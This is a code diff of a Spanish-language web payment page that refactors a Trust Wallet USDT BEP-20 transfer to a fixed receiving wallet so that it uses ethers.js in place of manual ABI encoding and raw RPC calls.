@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QR pagos - Enviar</title>
 
+    <!-- Cargamos ethers.js desde CDN oficial para manejar el contrato de forma nativa -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
     <style>
         :root { color-scheme: light; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -101,7 +104,12 @@
 const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
 const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-const DECIMALS = 18n;
+
+// ABI mínimo indispensable estándar para consultar balance y transferir tokens BEP-20
+const USDT_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address to, uint256 amount) returns (bool)"
+];
 
 const connectBtn = document.getElementById("connectBtn");
 const statusDiv = document.getElementById("status");
@@ -124,51 +132,33 @@ function setStatus(m) {
     statusDiv.style.display = m ? "block" : "none";
 }
 
-function provider() {
+function getRawProvider() {
     if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
     if (window.ethereum) return window.ethereum;
     throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
 }
 
-function pad64(h) { return h.replace(/^0x/, "").padStart(64, "0"); }
-function encAddr(a) { return pad64(a.toLowerCase()); }
-function encUint(v) { return BigInt(v).toString(16).padStart(64, "0"); }
-function format18(v) {
-    v = BigInt(v);
-    const b = 10n ** DECIMALS, w = v / b, f = (v % b).toString().padStart(18, "0").replace(/0+$/, "");
-    return f ? `${w}.${f}` : w.toString();
-}
-
-async function ensureBSC() {
-    const p = provider();
-    const accounts = await p.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) throw new Error("No se obtuvo acceso a la cuenta.");
-    walletAddress = accounts[0];
-}
-
-async function publicRpc(method, params = []) {
-    const response = await fetch(BSC_PUBLIC_RPC, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
-    });
-    const json = await response.json();
-    if (json.error) throw new Error("RPC público: " + (json.error.message || JSON.stringify(json.error)));
-    return json.result;
-}
-
-async function balanceOf(owner) {
-    const data = "0x70a08231" + encAddr(owner);
-    const result = await publicRpc("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
-    return BigInt(result || "0x0");
+async function getBalance(address) {
+    // Lectura robusta mediante proveedor público de respaldo para evitar bloqueos RPC de la app
+    const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
+    const contract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, providerRpc);
+    const bal = await contract.balanceOf(address);
+    return bal;
 }
 
 connectBtn.addEventListener("click", async () => {
     try {
+        const rawProv = getRawProvider();
+        const provider = new ethers.providers.Web3Provider(rawProv);
+
         if (!walletAddress) {
             connectBtn.disabled = true;
             setStatus("Estableciendo enlace con Trust Wallet...");
-            await ensureBSC();
+            
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            walletAddress = await signer.getAddress();
+
             walletAddressText.textContent = abreviarDireccion(walletAddress);
             walletInfo.style.display = "block";
             networkInfo.style.display = "flex";
@@ -180,67 +170,44 @@ connectBtn.addEventListener("click", async () => {
         }
 
         connectBtn.disabled = true;
-        const balance = await balanceOf(walletAddress);
-        if (balance === 0n) throw new Error("La cuenta no dispone de USDT BEP-20.");
+        
+        // Verificamos saldo on-chain
+        const balance = await getBalance(walletAddress);
+        if (balance.eq(0)) throw new Error("La cuenta no dispone de USDT BEP-20.");
 
         const amountRaw = String(amountDisplay.value || "").trim().replace(",", ".");
         if (!/^(?:\d+)(?:\.\d{1,18})?$/.test(amountRaw)) throw new Error("Ingrese un monto válido.");
-        
-        const [whole, fraction = ""] = amountRaw.split(".");
-        const amountUnits = BigInt(whole) * (10n ** DECIMALS) + BigInt(fraction.padEnd(18, "0").slice(0, 18));
-        
-        if (amountUnits <= 0n) throw new Error("El monto debe ser mayor que cero.");
-        if (amountUnits > balance) throw new Error("Saldo USDT insuficiente.");
 
-        const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
+        const amountUnits = ethers.utils.parseUnits(amountRaw, 18);
+        if (amountUnits.lte(0)) throw new Error("El monto debe ser mayor que cero.");
+        if (amountUnits.gt(balance)) throw new Error("Saldo USDT insuficiente.");
+
+        setStatus("Abriendo ventana de aprobación en Trust Wallet...");
+
+        // ARQUITECTURA NUEVA: Usamos Signer y Contrato nativo de Ethers.js
+        // Esto evita por completo el error 4200 del navegador interno al delegar la firma al SDK integrado.
+        const signer = provider.getSigner();
+        const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);
+
+        const tx = await usdtContract.transfer(BILLETERA_DESTINO, amountUnits);
         
-        setStatus("Estimando gas para la firma...");
+        setStatus(`Transacción enviada. Esperando confirmación...<br>Hash: ${tx.hash}`);
 
-        const p = provider();
+        // Esperamos a que la red mine la transacción
+        const receipt = await tx.wait();
 
-        // Estimación dinámica de gas en RPC público para evitar el bloqueo del navegador de Trust Wallet
-        let gasLimitHex = "0x11170"; // 70,000 gas por defecto para contratos BEP-20
-        try {
-            const estGas = await publicRpc("eth_estimateGas", [{
-                from: walletAddress,
-                to: CONTRATO_USDT,
-                value: "0x0",
-                data: data
-            }]);
-            if (estGas) {
-                gasLimitHex = "0x" + Math.floor(Number(estGas) * 1.25).toString(16);
-            }
-        } catch (err) {
-            console.warn("Estimación automática omitida, usando gas estándar:", err);
+        if (receipt.status === 1) {
+            setStatus(`¡Transferencia confirmada con éxito!<br>Hash: ${tx.hash}`);
+            connectBtn.innerText = "Completado";
+        } else {
+            throw new Error("La transacción falló en la blockchain.");
         }
 
-        setStatus("Abriendo ventana de confirmación en Trust Wallet...");
-
-        // LLAMADA ESTRICTA IN-APP: Obliga a la pasarela flotante de la app a mostrar la firma con gas seguro
-        const txHash = await p.request({
-            method: 'eth_sendTransaction',
-            params: [{
-                from: walletAddress,
-                to: CONTRATO_USDT,
-                value: "0x0",
-                data: data,
-                gas: gasLimitHex
-            }]
-        });
-
-        if (!txHash) {
-            throw new Error("Transacción cancelada o sin respuesta de la billetera.");
-        }
-
-        setStatus(`¡Transacción firmada con éxito!<br>Hash: ${txHash}`);
-        connectBtn.innerText = "Completado";
         connectBtn.disabled = false;
 
     } catch (e) {
-        console.error("ERROR:", e);
-        // Si el usuario cancela en la ventana de firma flotante, se muestra claramente aquí sin falsos positivos
-        const errorMsg = e?.message || "Operación cancelada.";
-        setStatus("Aviso: " + errorMsg);
+        console.error("ERROR DE PASARELA:", e);
+        setStatus("Aviso: " + (e.reason || e.message || "Operación cancelada."));
         connectBtn.disabled = false;
         connectBtn.innerText = walletAddress ? "Enviar USDT" : "Conectar a la Pasarela de pago";
     }
@@ -249,8 +216,8 @@ connectBtn.addEventListener("click", async () => {
 maxAction.addEventListener("click", async () => {
     if (!walletAddress) return;
     try {
-        const b = await balanceOf(walletAddress);
-        amountDisplay.value = format18(b);
+        const b = await getBalance(walletAddress);
+        amountDisplay.value = ethers.utils.formatUnits(b, 18);
         setStatus("Saldo máximo cargado.");
     } catch (e) {
         setStatus("Error al leer el saldo.");
